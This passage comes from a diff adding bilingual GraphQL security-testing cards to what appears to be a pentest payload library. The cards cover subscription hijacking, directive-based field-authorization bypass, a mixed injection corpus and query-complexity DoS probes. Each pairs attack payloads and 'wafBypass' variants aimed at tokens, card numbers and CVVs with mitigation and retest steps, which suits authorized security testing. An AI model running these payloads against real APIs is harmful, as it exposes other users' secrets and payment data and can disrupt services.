+     "en": "Record WebSocket or SSE handshakes, connection parameters, subscription acknowledgements, and event-delivery logs."
+    }
+   ],
+   "tutorial": {
+    "overview": {
+     "zh": "该 Payload 覆盖 GraphQL Subscription 订阅授权场景，检验连接、订阅注册与事件投递三阶段的持续校验。验证维度为他人对象敏感订阅的发起矩阵，对应第 1 步。",
+     "en": "This payload covers GraphQL subscription authorization, testing continuous checks across connection, subscribe registration and event delivery. Validation is an initiation matrix over other-user sensitive subscriptions, mapped to step 1."
+    },
+    "vulnerability": {
+     "zh": "根因在于订阅授权仅在连接建立阶段执行而主题注册与事件投递阶段脱节：低权连接订阅他人事件流后即可实时持续接收敏感字段的更新推送。",
+     "en": "The root cause is subscription authorization running only at connection setup while topic registration and event delivery go unchecked: low-privilege connections subscribing to others' streams keep receiving real-time sensitive field updates."
+    },
+    "exploitation": {
+     "zh": "第 1 步按脚本以当前身份逐条发起他人对象与敏感字段的订阅，记录订阅是否被接受及后续投递内容：非授权事件流持续推送即确认订阅授权缺失，捕获首条投递作为证据。成功判据以投递内容与身份对照为准。占位符在全局变量菜单替换。",
+     "en": "In step 1, initiate other-user and sensitive-field subscriptions one by one as the current identity per the script, recording acceptances and subsequent deliveries; unauthorized event streams pushing continuously confirm missing subscription authorization, with first deliveries captured as evidence. Judge success by delivery content versus identity. Replace placeholders via the global variables menu."
+    },
+    "mitigation": {
+     "zh": "订阅注册与每次投递都对照主体重校验主题与字段权限，会话失效即断流。修复后重放第 1 步矩阵，非授权订阅应被拒绝或投递为空。",
+     "en": "Re-validate topic and field permissions per principal at registration and every delivery, cutting streams on session loss. After the fix, replay the step 1 matrix: unauthorized subscriptions should be rejected or deliver empty."
+    },
+    "difficulty": "advanced"
+   },
+   "attackChain": [
+    {
+     "title": {
+      "zh": "建立自身事件订阅基线",
+      "en": "Establish a self-event baseline"
+     },
+     "description": {
+      "zh": "以低权限账户订阅自身测试事件，记录连接身份、主题过滤和事件字段。",
+      "en": "Subscribe to the account's own test event and record connection identity, topic filtering, and event fields."
+     },
+     "payload": "subscription{userUpdated{id email role secretToken}}\nsubscription{messageCreated{id content sender{email}}}\nsubscription{orderCreated{id total user{email creditCard}}}\nsubscription{paymentProcessed{id amount card{number cvv}}}\nsubscription{adminAction{id action user{email}}}\nsubscription{secretChanged{id value}}\nsubscription{configUpdated{id key value}}\nsubscription{userLoggedIn{id ip userAgent token}}\nsubscription{fileUploaded{id path content}}\nsubscription{logCreated{id level message stack}}"
+    },
+    {
+     "title": {
+      "zh": "注册敏感事件订阅",
+      "en": "Register sensitive event subscriptions"
+     },
+     "description": {
+      "zh": "在隔离环境提交原始订阅集合，但只由测试事件源生成无害标记事件。",
+      "en": "Submit the original subscription set in isolation while generating harmless marker events only from test sources."
+     },
+     "payload": "subscription{userUpdated{id email role secretToken}}\nsubscription{messageCreated{id content sender{email}}}\nsubscription{orderCreated{id total user{email creditCard}}}\nsubscription{paymentProcessed{id amount card{number cvv}}}\nsubscription{adminAction{id action user{email}}}\nsubscription{secretChanged{id value}}\nsubscription{configUpdated{id key value}}\nsubscription{userLoggedIn{id ip userAgent token}}\nsubscription{fileUploaded{id path content}}\nsubscription{logCreated{id level message stack}}"
+    },
+    {
+     "title": {
+      "zh": "交叉主体并撤销权限",
+      "en": "Cross principals and revoke access"
+     },
+     "description": {
+      "zh": "由另一主体发布事件并撤销接收者权限，确认连接不会继续接收越权内容。",
+      "en": "Publish from another principal and revoke receiver access, confirming the connection does not continue receiving unauthorized content."
+     },
+     "payload": "curl -sS --max-time 5 -X POST http://{TARGET}/graphql -H \"Content-Type: application/json\" -d '{\"query\":\"subscription{userUpdated{id email role secretToken}}\",\"operationName\":null}' -H \"X-Subscription-Protocol: graphql-ws\""
+    },
+    {
+     "title": {
+      "zh": "修复事件级授权并复测",
+      "en": "Repair event-level authorization and retest"
+     },
+     "description": {
+      "zh": "加入投递前授权与连接失效后重放，确认自身事件可用且跨主体事件被过滤。",
+      "en": "After adding pre-delivery authorization and connection invalidation, replay to confirm self events remain available and cross-principal events are filtered."
+     },
+     "payload": "{\"type\":\"start\",\"id\":\"1\",\"payload\":{\"query\":\"subscription{messageCreated{id content sender{email}}}\"}}\n{\"type\":\"start\",\"id\":\"1\",\"payload\":{\"query\":\"subscription{userUpdated{secretToken}}\"}}"
+    }
+   ],
+   "references": [
+    "https://spec.graphql.org/October2021/#sec-Subscription",
+    "https://graphql.org/learn/subscriptions/"
+   ],
+   "analysis": {
+    "zh": "只有低权限连接收到其他主体或租户的真实测试事件，或权限撤销后仍持续收到事件，才确认问题；连接成功、schema 可见或没有事件投递都不足以证明。",
+    "en": "Confirmation requires a low-privilege connection to receive another principal's or tenant's real test event, or to continue receiving events after revocation. A successful connection, schema visibility, or absence of delivery is insufficient."
+   },
+   "opsecTips": [
+    {
+     "zh": "只发布带随机标记的测试事件，不触发真实支付、文件上传或管理操作。",
+     "en": "Publish only random-marker test events; do not trigger real payment, file-upload, or administrative actions."
+    },
+    {
+     "zh": "测试结束后主动关闭连接并清理事件总线中的测试订阅。",
+     "en": "Close connections explicitly and remove test subscriptions from the event bus after testing."
+    }
+   ],
+   "review": {
+    "decision": "payload",
+    "rationale": "原始内容是 GraphQL Subscription 文档，属于实时事件授权 Payload，不是工具命令。",
+    "issuesResolved": [
+     "corrected-name",
+     "added-lifecycle-authorization",
+     "added-prerequisites",
+     "added-four-part-tutorial",
+     "rewrote-specific-attack-chain",
+     "added-analysis-opsec",
+     "added-authoritative-references",
+     "preserved-source-command"
+    ]
+   },
+   "wafBypass": [
+    {
+     "title": {
+      "zh": "子协议变形",
+      "en": "Subprotocol Mutation"
+     },
+     "command": "new WebSocket('ws://{TARGET}/graphql', ['graphql-ws','graphql-transport-ws','v1'])",
+     "description": {
+      "zh": "轮换子协议命中未鉴权的老协议处理器。成功判据：连接建立并收到订阅推送。",
+      "en": "Rotating subprotocols hits unauthenticated legacy handlers. Success: the connection opens and pushes subscription events."
+     }
+    },
+    {
+     "title": {
+      "zh": "降级查询订阅",
+      "en": "Query-as-Subscription Downgrade"
+     },
+     "command": "curl -sS --max-time 5 -X POST http://{TARGET}/graphql -H \"Content-Type: application/json\" -d '{\"query\":\"subscription{userUpdated{id email role secretToken}}\",\"operationName\":null}' -H \"X-Subscription-Protocol: graphql-ws\"",
+     "description": {
+      "zh": "HTTP 通道模拟订阅协议头绕过 WebSocket-only 鉴权。成功判据：返回订阅初始数据或被接受。",
+      "en": "Simulating subscription protocol headers over HTTP bypasses WebSocket-only auth. Success: initial subscription data returns or the request is accepted."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "curl -sS --max-time 5 -X P",
+       "explanation": {
+        "zh": "curl 发起请求",
+        "en": "curl request"
+       },
+       "type": "function"
+      },
+      {
+       "part": "-X POST",
+       "explanation": {
+        "zh": "POST 方法",
+        "en": "POST method"
+       },
+       "type": "flag"
+      },
+      {
+       "part": "http://{TARGET}/graphql",
+       "explanation": {
+        "zh": "目标 URL",
+        "en": "Target URL"
+       },
+       "type": "url"
+      },
+      {
+       "part": "-H \"Content-Type: application/json",
+       "explanation": {
+        "zh": "自定义请求头",
+        "en": "Custom header"
+       },
+       "type": "header"
+      },
+      {
+       "part": "-d '{\"query\":\"subscription{u",
+       "explanation": {
+        "zh": "请求体数据",
+        "en": "Request body data"
+       },
+       "type": "payload"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "订阅 ID 复用劫持",
+      "en": "Subscription-ID Reuse Hijack"
+     },
+     "command": "{\"type\":\"start\",\"id\":\"1\",\"payload\":{\"query\":\"subscription{messageCreated{id content sender{email}}}\"}}\n{\"type\":\"start\",\"id\":\"1\",\"payload\":{\"query\":\"subscription{userUpdated{secretToken}}\"}}",
+     "description": {
+      "zh": "复用已鉴权订阅 ID 携带新查询绕过每订阅鉴权。成功判据：第二个查询收到推送。",
+      "en": "Reusing an authenticated subscription id with a new query bypasses per-subscription auth. Success: the second query receives pushes."
+     }
+    }
+   ],
+   "execution": [
+    {
+     "title": {
+      "zh": "Subscription劫持",
+      "en": "Validation step 1 for GraphQL Subscription Authorization Validation"
+     },
+     "command": "subscription{userUpdated{id email role secretToken}}\nsubscription{messageCreated{id content sender{email}}}\nsubscription{orderCreated{id total user{email creditCard}}}\nsubscription{paymentProcessed{id amount card{number cvv}}}\nsubscription{adminAction{id action user{email}}}\nsubscription{secretChanged{id value}}\nsubscription{configUpdated{id key value}}\nsubscription{userLoggedIn{id ip userAgent token}}\nsubscription{fileUploaded{id path content}}\nsubscription{logCreated{id level message stack}}",
+     "description": {
+      "zh": "把敏感订阅逐条以当前身份发起；非授权事件流返回数据，即确认订阅授权缺失。",
+      "en": "Initiate each sensitive subscription as the current identity; unauthorized event streams returning data confirm missing subscription authorization."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "subscription{userUpdated{id email role secretToken}}",
+       "explanation": {
+        "zh": "敏感用户事件订阅",
+        "en": "Sensitive user subscription"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "subscription{paymentProcessed{id amount card{number cvv}}}",
+       "explanation": {
+        "zh": "支付事件订阅",
+        "en": "Payment event subscription"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "subscription{secretChanged{id value}}",
+       "explanation": {
+        "zh": "密钥变更订阅",
+        "en": "Secret change subscription"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "subscription{logCreated{id level message stack}}",
+       "explanation": {
+        "zh": "日志事件订阅",
+        "en": "Log event subscription"
+       },
+       "type": "payload"
+      }
+     ],
+     "platform": "all",
+     "requiresAdmin": false
+    }
+   ],
+   "tags": [
+    "api2",
+    "subscription"
+   ]
+  },
+  {
+   "id": "api2-directive",
+   "name": {
+    "zh": "GraphQL 指令与字段授权验证",
+    "en": "GraphQL Directive and Field-Authorization Validation"
+   },
+   "description": {
+    "zh": "验证 @skip、@include、schema 内省和自定义指令参与查询时，字段解析器是否仍执行授权；同时把不可用于可执行文档的 @deprecated 样例作为验证阶段负对照。",
+    "en": "Validate whether field resolvers still authorize access when @skip, @include, introspection, or custom directives appear, while treating @deprecated in executable documents as a validation-stage negative control."
+   },
+   "category": {
+    "zh": "API安全",
+    "en": "API Security"
+   },
+   "subCategory": {
+    "zh": "GraphQL 授权与 IDOR",
+    "en": "GraphQL Authorization & IDOR"
+   },
+   "prerequisites": [
+    {
+     "zh": "已导出目标 schema 中可执行指令及其允许位置，并准备低权限测试主体。",
+     "en": "Executable directives and their allowed locations in the target schema are known, and a low-privilege test principal is ready."
+    },
+    {
+     "zh": "已记录不带指令的同字段查询结果、验证错误和解析器授权日志。",
+     "en": "Results, validation errors, and resolver authorization logs for equivalent fields without directives have been recorded."
+    }
+   ],
+   "tutorial": {
+    "overview": {
+     "zh": "该 Payload 覆盖 GraphQL 指令与字段授权场景，检验 skip、include 与废弃字段参与查询时的解析器授权一致性。验证维度为指令组合与废弃字段的提交矩阵，对应第 1 步。",
+     "en": "This payload covers GraphQL directive and field authorization, testing resolver authorization consistency when skip, include and deprecated fields join queries. Validation is a submission matrix of directive combos and deprecated fields, mapped to step 1."
+    },
+    "vulnerability": {
+     "zh": "根因在于字段授权在指令求值之前即短路返回，或废弃字段遗留了仍可用的解析器：指令组合让受限字段走非常规求值路径并返回敏感数据。",
+     "en": "The root cause is field authorization short-circuiting before directive evaluation, or deprecated fields keeping live resolvers: directive combos route restricted fields down unconventional evaluation paths returning sensitive data."
+    },
+    "exploitation": {
+     "zh": "第 1 步按脚本把 skip 与 include 组合及废弃字段变体逐条提交并记录返回字段：受限字段经指令路径返回即确认指令校验缺失，废弃字段返回值一并作为遗留证据。成功判据以返回字段矩阵为准。占位符在全局变量菜单替换。",
+     "en": "In step 1, submit skip and include combos plus deprecated-field variants one by one per the script, recording returned fields; restricted fields returning via directive paths confirm missing directive validation, with deprecated-field values archived as legacy evidence. Judge success by the returned-field matrix. Replace placeholders via the global variables menu."
+    },
+    "mitigation": {
+     "zh": "字段授权在指令求值后仍强制执行并清理废弃解析器，指令白名单限制可执行集。修复后重放第 1 步矩阵，全部变体应返回授权错误或空值。",
+     "en": "Enforce field authorization after directive evaluation, purge deprecated resolvers, and allowlist executable directives. After the fix, replay the step 1 matrix: every variant should return authorization errors or null."
+    },
+    "difficulty": "advanced"
+   },
+   "attackChain": [
+    {
+     "title": {
+      "zh": "识别标准与自定义指令",
+      "en": "Identify standard and custom directives"
+     },
+     "description": {
+      "zh": "从 schema 记录指令定义、允许位置和无指令字段授权基线。",
+      "en": "Record directive definitions, allowed locations, and the authorization baseline for fields without directives."
+     },
+     "payload": ""
+    },
+    {
+     "title": {
+      "zh": "逐种指令重放同一字段",
+      "en": "Replay the same field per directive"
+     },
+     "description": {
+      "zh": "提交原始指令集合并一次只观察一种组合，保留非法位置作为负对照。",
+      "en": "Submit the original directive set one combination at a time, retaining illegal locations as negative controls."
+     },
+     "payload": ""
+    },
+    {
+     "title": {
+      "zh": "关联验证与解析器授权",
+      "en": "Correlate validation and resolver authorization"
+     },
+     "description": {
+      "zh": "区分验证阶段拒绝、字段被跳过和解析器实际返回未授权敏感值。",
+      "en": "Distinguish validation rejection, skipped fields, and resolvers that actually return unauthorized sensitive values."
+     },
+     "payload": "{user(id:1){id email @skip(if:false) role @include(if:true) ...on Admin{secretToken @skip(if:false)}}}"
+    },
+    {
+     "title": {
+      "zh": "固定授权层并执行组合回归",
+      "en": "Fix the authorization layer and regress combinations"
+     },
+     "description": {
+      "zh": "将授权下沉后重放标准、自定义和非法指令，确认允许行为保留且拒绝一致。",
+      "en": "After moving authorization downward, replay standard, custom, and illegal directives to confirm allowed behavior remains and denials are consistent."
+     },
+     "payload": ""
+    }
+   ],
+   "references": [
+    "https://spec.graphql.org/October2021/#sec-Type-System.Directives",
+    "https://spec.graphql.org/October2021/#sec-Validation"
+   ],
+   "analysis": {
+    "zh": "确认标准是某个原本拒绝的敏感字段仅因合法指令组合而返回真实值。验证错误、字段省略、内省只返回名称或未定义自定义指令均属于负对照。",
+    "en": "Confirmation requires a sensitive field that is normally denied to return a real value solely because of a valid directive combination. Validation errors, omitted fields, name-only introspection, and undefined custom directives are negative controls."
+   },
+   "opsecTips": [
+    {
+     "zh": "先在 schema 副本确认自定义指令语义，不向生产端点盲目枚举未知指令。",
+     "en": "Confirm custom-directive semantics in a schema copy before testing; do not blindly enumerate unknown directives on production endpoints."
+    },
+    {
+     "zh": "只选择虚构敏感值，并把非法指令限制为单次验证请求。",
+     "en": "Select synthetic sensitive values only and limit illegal-directive controls to a single validation request."
+    }
+   ],
+   "review": {
+    "decision": "payload",
+    "rationale": "原始内容混有有效标准指令、schema 内省、自定义指令和应失败的负对照；保留为验证 Payload 并纠正了“指令注入必然绕过”的错误表述。",
+    "issuesResolved": [
+     "corrected-technical-claim",
+     "documented-negative-controls",
+     "added-prerequisites",
+     "added-four-part-tutorial",
+     "rewrote-specific-attack-chain",
+     "added-analysis-opsec",
+     "added-authoritative-references",
+     "preserved-source-command"
+    ]
+   },
+   "wafBypass": [
+    {
+     "title": {
+      "zh": "自定义指令注入",
+      "en": "Custom Directive Injection"
+     },
+     "command": "{user(id:1){id email role secretToken @auth(bypass:true)}}\nquery @noAuth{user(id:1){secretToken}}",
+     "description": {
+      "zh": "伪造自定义指令命中实现宽松处理的指令处理器。成功判据：指令使字段返回。",
+      "en": "Forged custom directives hit leniently implemented handlers. Success: the directive makes the field return."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "secretToken @auth(bypass:true)",
+       "explanation": {
+        "zh": "伪造鉴权绕过指令",
+        "en": "Forged bypass directive"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "query @noAuth{user(id:1){secretToken}}",
+       "explanation": {
+        "zh": "免鉴权指令",
+        "en": "No-auth directive"
+       },
+       "type": "payload"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "嵌套 skip/include 组合",
+      "en": "Nested skip/include Combo"
+     },
+     "command": "{user(id:1){id email @skip(if:false) role @include(if:true) ...on Admin{secretToken @skip(if:false)}}}",
+     "description": {
+      "zh": "嵌套条件指令改变字段解析路径绕过静态审计。成功判据：特权字段按条件返回。",
+      "en": "Nested conditional directives alter field resolution past static auditing. Success: privileged fields return conditionally."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "{user(id:1){id email @skip(if:false) role @include(if:true){...on Admin{secretToken @skip(if:false)}}}}",
+       "explanation": {
+        "zh": "嵌套条件指令组合",
+        "en": "Nested conditional directives"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "@include(if:true){...on Admin",
+       "explanation": {
+        "zh": "条件内联片段",
+        "en": "Conditional inline fragment"
+       },
+       "type": "payload"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "变量控制指令",
+      "en": "Variable-Controlled Directive"
+     },
+     "command": "{\"query\":\"query($s:Boolean!,$i:Boolean!){user(id:1){email @skip(if:$s) secretToken @include(if:$i)}}\",\"variables\":{\"s\":false,\"i\":true}}",
+     "description": {
+      "zh": "指令条件移入变量绕过查询体中的 true 字面特征。成功判据：敏感字段被包含返回。",
+      "en": "Moving directive conditions into variables masks literal true signatures. Success: the sensitive field is included and returned."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "{\"query\":\"query($s:Boolean!,$i:Boolean!){user(id:1){email @skip(if:$s) secretToken @include(if:$i)}}\"",
+       "explanation": {
+        "zh": "变量控制指令",
+        "en": "Variable-controlled directives"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "\"variables\":{\"s\":false,\"i\":true}",
+       "explanation": {
+        "zh": "指令变量取值",
+        "en": "Directive variable values"
+       },
+       "type": "value"
+      }
+     ]
+    }
+   ],
+   "execution": [
+    {
+     "title": {
+      "zh": "Directive注入",
+      "en": "Validation step 1 for GraphQL Directive and Field-Authorization Validation"
+     },
+     "command": "{user(id:1){id email @skip(if:true) role @skip(if:true) secretToken @skip(if:true)}} \n {user(id:1){id email role @include(if:true) secretToken @include(if:true)}} \n {users{id email @skip(if:false) role @skip(if:false) password @skip(if:false)}} \n {admin{id username @include(if:true) apiKey @include(if:true) secretKey @include(if:true)}} \n {user(id:1){id email password @deprecated(reason:\"old field\")} secretToken @deprecated(reason:\"removed\")} \n {__type(name:\"User\"){fields(includeDeprecated:true){name isDeprecated}}} \n {__type(name:\"Admin\"){fields(includeDeprecated:true){name isDeprecated}}} \n {user(id:1)@auth(role:\"admin\"){id email role secretToken}}",
+     "description": {
+      "zh": "把指令与废弃字段变体逐条提交；受限字段经 skip/include 组合或废弃字段路径返回真实值，即确认字段授权缺失（而非指令校验问题）。",
+      "en": "Submit each directive and deprecated-field variant; skip, include, and deprecated combinations exposing restricted fields confirm missing directive validation."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "email @skip(if:true)",
+       "explanation": {
+        "zh": "跳过的邮件字段",
+        "en": "Skipped email field"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "secretToken @skip(if:true)",
+       "explanation": {
+        "zh": "跳过的敏感字段",
+        "en": "Skipped secret field"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "password @skip(if:false)",
+       "explanation": {
+        "zh": "保留的口令字段",
+        "en": "Kept password field"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "@deprecated reason:\"old field\"",
+       "explanation": {
+        "zh": "废弃标记负对照",
+        "en": "Deprecated negative control"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "{__type(name:\"User\"){fields(includeDeprecated:true){name isDeprecated}}}",
+       "explanation": {
+        "zh": "含废弃字段的内省",
+        "en": "Deprecated-inclusive introspection"
+       },
+       "type": "payload"
+      }
+     ],
+     "platform": "all",
+     "requiresAdmin": false
+    }
+   ],
+   "tags": [
+    "api2",
+    "directive"
+   ]
+  },
+  {
+   "id": "api2-json",
+   "name": {
+    "zh": "GraphQL 变量跨层输入混合集（待拆分）",
+    "en": "GraphQL Variable Cross-Layer Input Corpus (Split Required)"
+   },
+   "description": {
+    "zh": "原记录把 SQL 注入、路径遍历、批量赋值、结构化过滤、XSS、通配搜索和超大分页混在一个命令块中；这些输入到达不同下游解释器，必须拆成独立 Payload。",
+    "en": "The source mixes SQL injection, path traversal, mass assignment, structured filtering, XSS, wildcard search, and oversized pagination in one command block. These values reach different downstream interpreters and must be split into independent payloads."
+   },
+   "category": {
+    "zh": "API安全",
+    "en": "API Security"
+   },
+   "subCategory": {
+    "zh": "GraphQL 变量边界拆分",
+    "en": "GraphQL Variable Boundary Split"
+   },
+   "prerequisites": [
+    {
+     "zh": "仅在 schema 副本中记录每个变量的声明类型、解析器、下游存储和输出上下文。",
+     "en": "In a schema copy, record each variable's declared type, resolver, downstream store, and output context."
+    },
+    {
+     "zh": "为数据库、文件、对象绑定、渲染和资源限制分别准备独立可回滚基线。",
+     "en": "Prepare separate reversible baselines for database, file, object binding, rendering, and resource-limit boundaries."
+    }
+   ],
+   "tutorial": {
+    "overview": {
+     "zh": "GraphQL 变量只是结构化传输层，安全结论取决于变量进入 SQL、文件路径、对象绑定、HTML 输出或查询规划后的处理。原十行跨越至少六类根因，不能共用一套前提、证据和修复，因此本卡只承担审校与拆分说明。",
+     "en": "GraphQL variables are a structured transport layer; the security result depends on how a value is handled after reaching SQL, file paths, object binding, HTML output, or query planning. The ten lines span at least six root causes and cannot share prerequisites, evidence, or remediation, so this card exists only to govern the split."
+    },
+    "vulnerability": {
+     "zh": "把所有异常变量称为“JSON 注入”会掩盖真实边界：强类型 Int 通常在解析阶段拒绝 SQL 字符串，String 变量仍可能进入危险 SQL 或路径拼接，Input Object 可能触发批量赋值，而输出未编码才产生 XSS。必须按最终 sink 判定。",
+     "en": "Calling every abnormal variable JSON injection hides the real boundary. A typed Int normally rejects SQL text during coercion, a String may still reach unsafe SQL or path concatenation, an input object may enable mass assignment, and XSS requires an unsafe output sink. Classification must follow the final interpreter."
+    },
+    "exploitation": {
+     "zh": "先验证变量类型强制和正常值，再将原命令按 SQL、路径、对象绑定、结构化过滤、浏览器输出与资源限制六组逐行拆分。每个新条目只改变一个变量，关联相应下游日志，并将类型强制失败保留为负对照。",
+     "en": "Validate variable coercion and normal values first, then partition every original line into SQL, path, object-binding, structured-filter, browser-output, and resource-limit groups. Each replacement changes one variable, correlates the appropriate downstream log, and retains type-coercion failures as negative controls."
+    },
+    "mitigation": {
+     "zh": "在 GraphQL 类型强制之外，对每个业务字段实施允许列表和长度范围；数据库使用参数化查询，路径使用固定根目录与规范化校验，输入对象限制可写字段，HTML 按上下文编码，并对通配和分页设置查询成本上限。",
+     "en": "Beyond GraphQL coercion, allowlist and bound every business field. Use parameterized database queries, fixed-root path canonicalization, writable-field allowlists for input objects, context-aware HTML encoding, and query-cost limits for wildcard search and pagination."
+    },
+    "difficulty": "advanced"
+   },
+   "attackChain": [
+    {
+     "title": {
+      "zh": "绘制变量到下游边界映射",
+      "en": "Map variables to downstream boundaries"
+     },
+     "description": {
+      "zh": "记录每行变量声明、解析器和最终 SQL、路径、对象、HTML 或查询规划 sink。",
+      "en": "Record each line's variable declaration, resolver, and final SQL, path, object, HTML, or query-planning sink."
+     }
+    },
+    {
+     "title": {
+      "zh": "按六类边界分配原命令",
+      "en": "Partition commands into six boundaries"
+     },
+     "description": {
+      "zh": "逐行审阅原始命令并分配到唯一新 Payload，禁止将完整混合集直接执行。",
+      "en": "Review every original line and assign it to one unique replacement payload; never execute the mixed corpus as a whole."
+     },
+     "payloadRef": {
+      "area": "execution",
+      "index": 0
+     }
+    },
+    {
+     "title": {
+      "zh": "为每类建立独立证据",
+      "en": "Establish evidence per class"
+     },
+     "description": {
+      "zh": "在拆分条目中分别关联类型错误、数据库、文件、对象状态、DOM 和资源指标。",
+      "en": "In each replacement, correlate coercion errors, database, file, object state, DOM, or resource metrics as applicable."
+     }
+    },
+    {
+     "title": {
+      "zh": "按 sink 修复并逐条回归",
+      "en": "Remediate by sink and regress individually"
+     },
+     "description": {
+      "zh": "应用对应边界修复后逐条重放，确认正常变量保留且异常值在正确层被拒绝。",
+      "en": "After boundary-specific remediation, replay each line to confirm normal variables remain and abnormal values are rejected at the correct layer."
+     }
+    }
+   ],
+   "references": [
+    "https://spec.graphql.org/October2021/#sec-Input-Coercion",
+    "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"
+   ],
+   "analysis": {
+    "zh": "该源卡不能产生单一漏洞结论。最终拆分必须保证十条原命令完整且只出现一次，并且每个新卡的分类、证据与修复都对应实际下游 sink。",
+    "en": "This source card cannot support one vulnerability conclusion. The final split must preserve every original command exactly once, with each replacement's category, evidence, and remediation matching its actual downstream sink."
+   },
+   "opsecTips": [
+    {
+     "zh": "不要执行完整混合集；一次只在对应实验服务中验证一个变量和一个 sink。",
+     "en": "Do not execute the mixed corpus as a whole; validate one variable and one sink at a time in the corresponding lab service."
+    },
+    {
+     "zh": "禁止使用删表、真实文件或真实管理角色，全部替换为可回滚测试对象。",
+     "en": "Do not use table deletion, real files, or real administrative roles; substitute reversible test objects."
+    }
+   ],
+   "review": {
+    "decision": "split",
+    "rationale": "十行命令跨越六种下游解释边界，保留为单卡会给出错误教程和修复建议，必须逐行拆分。",
+    "issuesResolved": [
+     "identified-mixed-collection",
+     "corrected-technical-claim",
+     "planned-line-complete-split",
+     "added-prerequisites",
+     "added-four-part-tutorial",
+     "rewrote-specific-attack-chain",
+     "added-analysis-opsec",
+     "added-authoritative-references",
+     "preserved-source-command"
+    ],
+    "targetPayloadIds": [
+     "api2-variable-sql-boundary",
+     "api2-variable-path-boundary",
+     "api2-variable-mass-assignment",
+     "api2-variable-structured-filter",
+     "api2-variable-html-output",
+     "api2-variable-query-cost"
+    ]
+   }
+  },
+  {
+   "id": "api2-dos",
+   "name": {
+    "zh": "GraphQL 查询复杂度限制验证",
+    "en": "GraphQL Query Complexity Limit Validation"
+   },
+   "description": {
+    "zh": "使用受控深度、别名数量与递归关系查询验证 GraphQL 执行前的深度/宽度/成本限制。",
+    "en": "Use controlled depth, alias counts, and recursive relationship queries to verify GraphQL depth/width/cost limits before execution."
+   },
+   "category": {
+    "zh": "API安全",
+    "en": "API Security"
+   },
+   "subCategory": {
+    "zh": "批量查询与资源滥用",
+    "en": "Batch Queries & Resource Abuse"
+   },
+   "prerequisites": [
+    {
+     "zh": "在隔离环境获得服务端 CPU、内存、解析时长、resolver 数和查询成本指标。",
+     "en": "Server CPU, memory, parse time, resolver count, and query-cost metrics are available in an isolated environment."
+    },
+    {
+     "zh": "定义批准的最大深度、最大字段数、超时和立即停止阈值。",
+     "en": "Approved maximum depth, field count, timeout, and immediate stop thresholds are defined."
+    }
+   ],
+   "tutorial": {
+    "overview": {
+     "zh": "该 Payload 覆盖 GraphQL 查询复杂度限制验证场景，检验服务端对深度、宽度与递归关系的执行前限制。验证维度为深嵌套、别名堆叠与宽分页的边界探针矩阵，对应第 1 步。",
+     "en": "This payload covers GraphQL query-complexity limit validation, testing pre-execution limits on depth, width and recursive relations. Validation is a boundary-probe matrix of deep nesting, alias stacking and wide pagination, mapped to step 1."
+    },
+    "vulnerability": {
+     "zh": "根因在于服务端未在执行前限制文档深度与估算成本：嵌套与别名组合把单请求放大为指数级 resolver 调用，资源保护形同虚设。",
+     "en": "The root cause is servers skipping pre-execution depth limits and cost estimates: nesting plus alias combos amplify one request into exponential resolver calls, leaving resource protection nominal."
+    },
+    "exploitation": {
+     "zh": "第 1 步按脚本把深嵌套、别名与宽分页探针逐条提交并记录响应时间与服务端决策：耗时激增或拒绝缺失即确认成本边界缺口，探针规模保持在小样本以避免真实影响。成功判据以边界拒绝记录为准。占位符在全局变量菜单替换。",
+     "en": "In step 1, submit deep-nesting, alias and wide-pagination probes one by one per the script, recording response times and server decisions; spiking times or missing rejections confirm the cost-boundary gap, with probe sizes kept to small samples to avoid real impact. Judge success by boundary-rejection records. Replace placeholders via the global variables menu."
+    },
+    "mitigation": {
+     "zh": "部署深度限制与成本分析器并在校验阶段拒绝超限文档，对解析耗时建立基线告警。修复后重放第 1 步矩阵，全部探针应在执行前被拒绝。",
+     "en": "Deploy depth limits and cost analyzers rejecting over-limit documents at validation, with baseline alerts on resolver timing. After the fix, replay the step 1 matrix: every probe should be refused pre-execution."
+    },
+    "difficulty": "advanced"
+   },
+   "attackChain": [
+    {
+     "title": {
+      "zh": "建立最小查询资源基线",
+      "en": "Establish minimal-query resource baseline"
+     },
+     "description": {
+      "zh": "记录浅层单字段查询的解析、验证、resolver 数和资源使用。",
+      "en": "Record parsing, validation, resolver count, and resource use for a shallow single-field query."
+     },
+     "payload": ""
+    },
+    {
+     "title": {
+      "zh": "逐级增加一个复杂度维度",
+      "en": "Increase one complexity dimension"
+     },
+     "description": {
+      "zh": "按原始深度和别名样例单次重放，每次只增加深度、宽度或别名之一。",
+      "en": "Replay the original depth and alias probes one at a time, increasing only depth, breadth, or aliases."
+     },
+     "payload": "curl -sS --max-time 5 -X POST http://{TARGET}/graphql -H \"Content-Type: application/json\" -d '{\"query\":\"{...F __typename ...on Query{__typename ...on Query{__typename ...on Query{__typename ...on Query{__typename}}}}} fragment F on Query{__typename}\"}' --compressed"
+    },
+    {
+     "title": {
+      "zh": "确认预算拒绝或非线性增长",
+      "en": "Confirm budget rejection or nonlinear growth"
+     },
+     "description": {
+      "zh": "比较错误阶段和资源曲线，只有未受限且明显非线性增长才继续报告风险。",
+      "en": "Compare rejection stage and resource curves; report risk only for unbounded, clearly nonlinear growth."
+     },
+     "payload": ""
+    },
+    {
+     "title": {
+      "zh": "设置成本预算并重放",
+      "en": "Set cost budgets and replay"
+     },
+     "description": {
+      "zh": "配置深度、复杂度与超时后重放同一阶梯，确认高成本查询提前拒绝且正常查询不受影响。",
+      "en": "After configuring depth, complexity, and timeout budgets, replay the ladder to confirm expensive queries are rejected early while normal queries remain unaffected."
+     },
